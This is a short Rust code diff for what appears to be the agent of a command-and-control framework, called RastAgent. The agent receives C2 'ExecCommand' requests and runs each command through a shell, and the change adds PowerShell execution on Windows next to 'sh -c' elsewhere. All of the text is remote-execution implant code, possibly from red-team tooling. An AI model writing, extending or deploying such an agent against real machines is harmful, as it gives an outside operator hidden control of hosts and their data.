@@ -55,7 +55,17 @@ impl RastAgent {
                 let msg: AgentMessage = serde_json::from_slice(&msg.unwrap()).unwrap();
                 info!("Request {:?}", msg);
                 let AgentMessage::C2Request(C2Request::ExecCommand(cmd)) = msg else {todo!()};
-                let output = SystemCommand::new("sh").arg("-c").arg(cmd).output().await;
+
+                let output = if cfg!(target_os = "windows") {
+                    SystemCommand::new("powershell.exe")
+                        .arg("-c")
+                        .arg(cmd)
+                        .output()
+                        .await
+                } else {
+                    SystemCommand::new("sh").arg("-c").arg(cmd).output().await
+                };
+
                 info!("Response {:?}", output);
                 let response = match output {
                     Ok(output) => String::from_utf8(output.stdout)?,
